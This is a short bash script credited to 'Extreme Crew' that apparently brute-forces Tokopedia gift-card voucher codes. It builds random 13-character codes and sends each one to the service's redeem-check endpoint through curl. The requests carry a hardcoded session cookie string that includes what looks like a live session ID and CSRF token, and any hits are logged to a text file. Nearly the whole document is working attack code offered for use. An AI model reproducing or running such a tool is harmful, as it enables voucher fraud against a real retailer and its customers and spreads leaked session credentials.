#Coded By AchonkJust - Extreme Crew
#issued 07-Mar-2018
#ToloPedia Extrap auto redeem voucher
#Update!!
#!/bin/bash/sh
putih='\033[0m'
ijo='\e[38;5;82m'
merah='\e[38;5;196m'
 header(){
printf "${ijo}"
printf "     ___        __                _____ _____ _____   _       ________    \n"
printf "    /   | _____/ /_  ____  ____  / ___// ___// ___/  (_)_  __/ ____/ /_   \n"
printf "   / /| |/ ___/ __ \/ __ \/ __ \/ __ \/ __ \/ __ \  / / / / /___ \/ __/   \n"
printf "  / ___ / /__/ / / / /_/ / / / / /_/ / /_/ / /_/ / / / /_/ /___/ / /_     \n"
printf " /_/  |_\___/_/ /_/\____/_/ /_/\____/\____/\____/_/ /\__,_/_____/\__/     \n"
printf "==========ToloPedia Extrap Voucher=============/___/ By Extreme.Crew 	  \n"
}
rm -f extreme.crew
clear
header
if [ ! $1 ];then
echo "1 Akun Max 10 kali generate"
echo "Usage : $0 <jumlah generate>"
echo "EX : $0 10"
exit
fi
#Edit Your Cookies Here
ngelog(){
cok="_gorilla_csrf=MTUyNDQ3MjAxMnxJbmw2T1RWWlEyZFdPVGxMTkVwcGJuUXdNM1ZWUzBsUFlqTlViMjV0WmpJNU9WZDRhbkJpZUhwVE1XODlJZ289fI199vnVeSOsLGYQ4L7pkkh912catWI1t_o_O8v3WMvO; state=eyJsZCI6Imh0dHBzOi8vYWNjb3VudHMudG9rb3BlZGlhLmNvbS90aGFua3M_dGhlbWU9ZGVmYXVsdFx1MDAyNmxkPVx1MDAyNmFjdGl2YXRpb25fdHlwZT01IiwicmVmIjoiaHR0cHM6Ly93d3cudG9rb3BlZGlhLmNvbSIsInV1aWQiOiIwNWRhZWQ5Ny02NDM2LTQ5MDUtODI3Yi0wNTMzNDA4ZmYzMGYiLCJ0aGVtZSI6ImRlZmF1bHQifQ; _dc_gtm_UA-9801603-1=1; _BID_TOKOPEDIA_=270b50252c10cc87501fd0002072f346; l=1; _ID_autocomplete_=2425d38b40a04c9bba410313823b4680; scs=%7B%22t%22%3A1%7D; insdrSV=1; __asc=84070a1f162f19c861f6e99a89f; __auc=84070a1f162f19c861f6e99a89f; pulsa-aff=undefined; o_Pulsa=eyJsYXN0X2RlY2xpbmUiOiIiLCJyZWZlcnJlciI6Imh0dHBzOi8vcHVsc2EudG9rb3BlZGlhLmNvbS9naWZ0LWNhcmQvdG9rb3BlZGlhL3JlZGVlbS8iLCJpc19taWNyb3NpdGUiOmZhbHNlLCJ1dWlkIjoiZWQ0NWU4MjAtYjk3NS00OTIzLTkzNjQtOWNhYzhhY2VhYjgyIiwiaXNfYWpheCI6dHJ1ZX0; _ga=GA1.2.416256856.1524471991; _gid=GA1.2.1174521022.1524471991; _dc_gtm_UA-9801603-23=1; _uetsid=_uet04455918; _SID_Tokopedia_=HH_6OpTyQjBBlVdI3x2UgUspG7PcdsTUzFb6ckozjbO8ND-MX0MUcZYEsg5bAazI7rR9RUXZIC3FYMMH4-WM551WQ6_q3nBFtmGQfYb07mhB5QxlP8PDU6bTh2vuow4c; _ampSES=829b40e186SES1f51709cd802-30798-1524472009064; _ampUITN=42b8e5609cbota1d72804db80-30798-1524472009068; _ampNV=0; _ampRV=1; _ampCon=Canada; _ampCity=Montreal"
	curl -s -X GET \
--url "https://pulsa.tokopedia.com/gift-card/tokopedia/redeem/check?voucher_code=FPL$1" \
-H "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
-H "accept-encoding: gzip, deflate, br" \
-H "cookie: $cok" \
-H "accept-language: en-US,en;q=0.9" \
-H "cache-control: max-age=0" \
-H "upgrade-insecure-requests: 1" \
-H "user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTssML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
}

for generate in $(cat /dev/urandom | tr -dc 'A-Z0-9' | fold -w 13 | head -n 10); do
	ngegas=$(ngelog $generate | grep -Po "(?<=\"message\":\").*?(?=\"\,\")")
	if [[ "$ngegas" ]]; then
		echo "$ngegas"
		echo "[-$ngegas-] $generate" >> tokopedia.txt
	fi
done
rm -f extreme.crew
